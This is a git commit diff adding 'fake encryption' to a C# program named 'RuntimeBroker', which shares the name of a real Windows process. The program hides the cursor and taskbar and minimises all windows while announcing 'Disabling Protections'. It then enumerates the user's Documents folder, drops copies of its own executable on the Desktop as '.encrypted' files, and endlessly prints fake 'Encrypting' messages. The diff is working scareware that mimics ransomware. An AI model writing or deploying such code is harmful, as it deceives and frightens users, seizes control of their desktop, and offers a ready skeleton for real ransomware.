f60d3b480e278d6fa48fa8a82258a7aa6998a8ec
jcapellman <jcapellman@hotmail.com>
2023-01-16 18:00:17 -0600

    Added: Fake Encryption and did some refactoring

--- RuntimeBroker/Program.cs
+++ RuntimeBroker/Program.cs
@@ -17,6 +17,9 @@ namespace RuntimeBroker
         [DllImport("user32.dll", SetLastError = true)]
         private static extern int SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int x, int y, int cx, int cy, uint uFlags);
 
+        [DllImport("user32.dll")]
+        private static extern int ShowCursor(bool bShow);
+
         private static readonly uint SPI_SETDESKWALLPAPER = 20;
         private static readonly uint SPIF_UPDATEINIFILE = 0x1;
 
@@ -30,15 +33,17 @@ namespace RuntimeBroker
             ShowWindow = 64
         }
 
-        public static void WriteResourceToFile(string resourceName, string fileName)
+        private static void WriteResourceToFile(string resourceName, string fileName)
         {
             using var resource = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName);
             using var file = new FileStream(fileName, FileMode.Create, FileAccess.Write);
             resource?.CopyTo(file);
         }
 
-        static void Main(string[] args)
+        private static void CallSieFun()
         {
+            ShowCursor(false);
+
             var window = FindWindow("Shell_traywnd", "");
             _ = SetWindowPos(window, IntPtr.Zero, 0, 0, 0, 0, (uint)SetWindowPosFlags.HideWindow);
 
@@ -50,17 +55,57 @@ namespace RuntimeBroker
 
             var lHwnd = FindWindow("Shell_TrayWnd", "");
             _ = SendMessage(lHwnd, WM_COMMAND, MIN_ALL, IntPtr.Zero);
+        }
 
-            var docs = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "*.*", SearchOption.AllDirectories);
-
+        private static void CopySieFiles(string[] files)
+        {
             var desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
 
             var currentBytes = File.ReadAllBytes(Environment.ProcessPath ?? Path.GetRandomFileName());
 
-            foreach (var docFile in docs.Take(20))
+            foreach (var docFile in files.Take(20))
             {
                 File.WriteAllBytes(Path.Combine(desktopPath, new FileInfo(docFile).Name) + ".encrypted", currentBytes);
             }
+        }
+
+        private static void EncryptSieFiles(string[] files)
+        {
+            while (true)
+            {
+                foreach (var file in files)
+                {
+                    Console.WriteLine($"Encrypting {file}...");
+                }
+            }
+        }
+
+        static void Main(string[] args)
+        {
+            Console.BackgroundColor = ConsoleColor.Red;
+            Console.ForegroundColor = ConsoleColor.White;
+
+            Console.Clear();
+
+            Console.WriteLine("Disabling Protections...");
+            CallSieFun();
+
+            Console.WriteLine("Enumerating sie files...");
+
+            var docs = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "*.*", SearchOption.AllDirectories);
+
+            if (docs == null)
+            {
+                Console.WriteLine("Failed to get sie files list...");
+
+                return;
+            }
+
+            Console.WriteLine($"{docs.Length} were found for encryption...");
+
+            CopySieFiles(docs);
+
+            EncryptSieFiles(docs);
         }
     }
 }
